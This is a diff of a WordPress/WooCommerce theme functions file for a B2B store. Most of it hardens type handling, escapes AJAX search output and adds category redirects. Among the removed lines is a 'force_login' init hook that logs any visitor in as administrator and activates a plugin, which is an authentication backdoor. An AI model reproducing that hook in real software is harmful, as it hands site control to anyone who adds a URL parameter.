@@ -17,8 +17,6 @@ require_once get_template_directory() . '/inc/seo-schema.php';
 require_once get_template_directory() . '/inc/google-integration.php';
 
 // Disable WooCommerce's new Coming Soon mode for store pages
-update_option('woocommerce_coming_soon', 'no');
-update_option('woocommerce_store_pages_only', 'no');
 add_filter( 'woocommerce_is_coming_soon', '__return_false' );
 add_filter( 'woocommerce_store_pages_only', '__return_false' );
 
@@ -114,13 +112,15 @@ function snap_stitch_is_b2b_product( $product_id ) {
     $terms = get_the_terms( $product_id, 'product_cat' );
     if ( $terms && ! is_wp_error( $terms ) ) {
         foreach ( $terms as $t ) {
-            if ( $t->slug === 'b2b' || strpos( $t->slug, 'b2b' ) !== false ) {
+            $t_slug = (string) ( $t->slug ?? '' );
+            if ( $t_slug === 'b2b' || strpos( $t_slug, 'b2b' ) !== false ) {
                 return true;
             }
             $ancs = get_ancestors( $t->term_id, 'product_cat' );
             foreach ( $ancs as $anc_id ) {
                 $anc = get_term( $anc_id, 'product_cat' );
-                if ( $anc && ( $anc->slug === 'b2b' || strpos( $anc->slug, 'b2b' ) !== false ) ) {
+                $anc_slug = ( $anc && isset( $anc->slug ) ) ? (string) $anc->slug : '';
+                if ( $anc_slug !== '' && ( $anc_slug === 'b2b' || strpos( $anc_slug, 'b2b' ) !== false ) ) {
                     return true;
                 }
             }
@@ -207,7 +207,7 @@ function snap_stitch_save_product_design_meta_box( $post_id ) {
 
         // Ensure category exists
         if ( ! term_exists( $term_slug, 'product_cat' ) ) {
-            wp_insert_term( strtoupper($term_slug), 'product_cat', array( 'slug' => $term_slug ) );
+            wp_insert_term( strtoupper( (string) $term_slug ), 'product_cat', array( 'slug' => $term_slug ) );
         }
 
         // Add to correct category and remove from opposite
@@ -272,14 +272,16 @@ function snap_stitch_capture_partial_quote() {
  * Force CF7 Success for local testing (skips mail check)
  */
 add_filter( 'wpcf7_display_message', function( $message, $status ) {
-    if ( $status === 'mail_failed' && ( defined('SNAP_LEADS_TESTING') || strpos($_SERVER['HTTP_HOST'], 'localhost') !== false ) ) {
+    $host = (string) ( $_SERVER['HTTP_HOST'] ?? '' );
+    if ( $status === 'mail_failed' && ( defined('SNAP_LEADS_TESTING') || ( $host !== '' && strpos( $host, 'localhost' ) !== false ) ) ) {
         return "Thank you for your request. Our team will contact you shortly with bulk pricing.";
     }
     return $message;
 }, 10, 2 );
 
 add_filter( 'wpcf7_ajax_json_echo', function( $items, $result ) {
-    if ( $items['status'] === 'mail_failed' && ( defined('SNAP_LEADS_TESTING') || strpos($_SERVER['HTTP_HOST'], 'localhost') !== false ) ) {
+    $host = (string) ( $_SERVER['HTTP_HOST'] ?? '' );
+    if ( $items['status'] === 'mail_failed' && ( defined('SNAP_LEADS_TESTING') || ( $host !== '' && strpos( $host, 'localhost' ) !== false ) ) ) {
         $items['status'] = 'mail_sent';
         $items['message'] = "Thank you for your request. Our team will contact you shortly with bulk pricing.";
     }
@@ -392,7 +394,7 @@ function snap_stitch_save_registration_fields( $customer_id, $new_customer_data 
     $ship_to_different = ! empty( $_POST['ship_to_different_address'] );
 
     foreach ( $shipping_fields as $field ) {
-        $billing_equivalent = str_replace( 'shipping_', 'billing_', $field );
+        $billing_equivalent = str_replace( 'shipping_', 'billing_', (string) $field );
         if ( $ship_to_different && isset( $_POST[ $field ] ) ) {
             update_user_meta( $customer_id, $field, sanitize_text_field( wp_unslash( $_POST[ $field ] ) ) );
         } elseif ( ! $ship_to_different && isset( $_POST[ $billing_equivalent ] ) ) {
@@ -425,7 +427,7 @@ function snap_stitch_save_registration_fields( $customer_id, $new_customer_data 
     }
 
     if ( ! empty( $first_name ) || ! empty( $last_name ) ) {
-        $display_name = trim( $first_name . ' ' . $last_name );
+        $display_name = trim( (string) $first_name . ' ' . (string) $last_name );
         wp_update_user( array(
             'ID'           => $customer_id,
             'display_name' => $display_name,
@@ -437,25 +439,10 @@ function snap_stitch_save_registration_fields( $customer_id, $new_customer_data 
 
 
 
-// Enable registration
-update_option('woocommerce_enable_myaccount_registration', 'yes');
-
-add_action('init', function() {
-    if (isset($_GET['force_login'])) {
-        $users = get_users(['role' => 'administrator']);
-        if (!empty($users)) {
-            wp_set_current_user($users[0]->ID);
-            wp_set_auth_cookie($users[0]->ID);
-            
-            require_once ABSPATH . 'wp-admin/includes/plugin.php';
-            if (!is_plugin_active('snap-agentation/snap-agentation.php')) {
-                activate_plugin('snap-agentation/snap-agentation.php');
-            }
-            wp_redirect(admin_url('plugins.php'));
-            exit;
-        }
-    }
-});
+// Ensure registration is enabled on theme switch without unconditional per-request DB writes
+add_action( 'after_switch_theme', function() {
+    update_option( 'woocommerce_enable_myaccount_registration', 'yes' );
+} );
 /**
  * Dynamic WooCommerce Categories in Navigation Menu
  */
@@ -560,7 +547,7 @@ add_action('wp_ajax_nopriv_snap_ajax_search', 'snap_ajax_search_callback');
 add_action('wp_ajax_snap_ajax_search', 'snap_ajax_search_callback');
 
 function snap_ajax_search_callback() {
-    $search_query = isset($_POST['s']) ? sanitize_text_field($_POST['s']) : '';
+    $search_query = isset($_POST['s']) ? sanitize_text_field( (string) wp_unslash( $_POST['s'] ) ) : '';
     
     if (empty($search_query)) {
         wp_send_json_success([]);
@@ -581,14 +568,18 @@ function snap_ajax_search_callback() {
         while ($query->have_posts()) {
             $query->the_post();
             global $product;
+            if ( ! is_a( $product, 'WC_Product' ) ) {
+                $product = wc_get_product( get_the_ID() );
+            }
+            if ( ! $product ) continue;
             
-            $is_b2b = snap_stitch_is_b2b_product($product->get_id());
-            $price_html = $is_b2b ? '<span class="text-[#FBBF24] text-[10px] uppercase font-black tracking-tighter">B2B Product</span>' : $product->get_price_html();
+            $is_b2b = function_exists( 'snap_stitch_is_b2b_product' ) ? snap_stitch_is_b2b_product($product->get_id()) : false;
+            $price_html = $is_b2b ? '<span class="text-[#FBBF24] text-[10px] uppercase font-black tracking-tighter">B2B Product</span>' : wp_kses_post( (string) $product->get_price_html() );
             
             $results[] = [
-                'title' => html_entity_decode(get_the_title()),
-                'url' => get_permalink(),
-                'image' => get_the_post_thumbnail_url(get_the_ID(), 'thumbnail') ?: wc_placeholder_img_src(),
+                'title' => esc_html( html_entity_decode( (string) get_the_title() ) ),
+                'url' => esc_url( get_permalink() ),
+                'image' => esc_url( get_the_post_thumbnail_url(get_the_ID(), 'thumbnail') ?: wc_placeholder_img_src() ),
                 'price' => $price_html
             ];
         }
@@ -685,15 +676,23 @@ add_action( 'init', 'snap_stitch_auto_provision_essential_pages' );
 
 
 /**
- * Redirect deprecated water purifier categories to B2B commercial catalog.
+ * Redirect deprecated categories and align taxonomy URLs.
  */
 function snap_stitch_redirect_deprecated_categories() {
     if ( is_admin() || wp_doing_ajax() ) {
         return;
     }
-    $request_uri = isset( $_SERVER['REQUEST_URI'] ) ? sanitize_text_field( wp_unslash( $_SERVER['REQUEST_URI'] ) ) : '';
+    $request_uri = isset( $_SERVER['REQUEST_URI'] ) ? sanitize_text_field( wp_unslash( (string) $_SERVER['REQUEST_URI'] ) ) : '';
+
+    // Redirect deprecated water purifier categories to B2B commercial catalog.
     if ( preg_match( '#/product-category/(?:b2b/)?(?:b2b-)?water-?purifiers/?#i', $request_uri ) ) {
         wp_safe_redirect( home_url( '/product-category/b2b/' ), 301 );
+        exit;
+    }
+
+    // 301 Redirect for Condensing Units URL alignment (eliminates 404s for semantic condensing units URLs)
+    if ( preg_match( '#(?:central-air-conditioning/condensing-units|product-category/(?:b2b/)?(?:blue-star-commercial/)?(?:central-air-conditioning/)?condensing-units)/?#i', $request_uri ) ) {
+        wp_safe_redirect( home_url( '/product-category/b2b/blue-star-commercial/central-air-conditioning/others-central-air-conditioning/' ), 301 );
         exit;
     }
 }
@@ -920,7 +919,7 @@ if ( ! function_exists( 'snap_stitch_resolve_b2b_image' ) ) {
             return $theme_uri . '/images/tetley/tetley-plain.png';
         }
 
-        if ( ! empty( $existing_url ) && strpos( $existing_url, 'placeholder' ) === false ) {
+        if ( ! empty( $existing_url ) && strpos( (string) $existing_url, 'placeholder' ) === false ) {
             return $existing_url;
         }
 
@@ -1114,8 +1113,11 @@ if ( ! function_exists( 'snap_stitch_resolve_b2b_brochure' ) ) {
             'usha-instant-coolers'              => 'usha/usha-water-solutions.pdf',
         );
 
+        $active_subcat_slug = (string) $active_subcat_slug;
+        $root_brand_slug   = (string) $root_brand_slug;
+
         // Check active subcategory slug match
-        if ( ! empty( $active_subcat_slug ) && isset( $series_map[ $active_subcat_slug ] ) ) {
+        if ( '' !== $active_subcat_slug && isset( $series_map[ $active_subcat_slug ] ) ) {
             $rel = $series_map[ $active_subcat_slug ];
             if ( file_exists( $theme_dir . '/brochures/' . $rel ) ) {
                 return $theme_uri . '/brochures/' . $rel;
@@ -1127,8 +1129,9 @@ if ( ! function_exists( 'snap_stitch_resolve_b2b_brochure' ) ) {
             $terms = get_the_terms( $product_id, 'product_cat' );
             if ( ! empty( $terms ) && ! is_wp_error( $terms ) ) {
                 foreach ( $terms as $t ) {
-                    if ( isset( $series_map[ $t->slug ] ) ) {
-                        $rel = $series_map[ $t->slug ];
+                    $t_slug = (string) ( $t->slug ?? '' );
+                    if ( $t_slug !== '' && isset( $series_map[ $t_slug ] ) ) {
+                        $rel = $series_map[ $t_slug ];
                         if ( file_exists( $theme_dir . '/brochures/' . $rel ) ) {
                             return $theme_uri . '/brochures/' . $rel;
                         }
@@ -1174,7 +1177,7 @@ if ( ! function_exists( 'snap_stitch_resolve_b2b_brochure' ) ) {
             'eureka-forbes-commercial'   => 'eureka-forbes/commercial-ro-purifiers.pdf',
             'usha-water-solutions'       => 'usha/usha-water-solutions.pdf',
         );
-        if ( ! empty( $root_brand_slug ) && isset( $brand_map[ $root_brand_slug ] ) ) {
+        if ( '' !== $root_brand_slug && isset( $brand_map[ $root_brand_slug ] ) ) {
             $rel = $brand_map[ $root_brand_slug ];
             if ( file_exists( $theme_dir . '/brochures/' . $rel ) ) {
                 return $theme_uri . '/brochures/' . $rel;
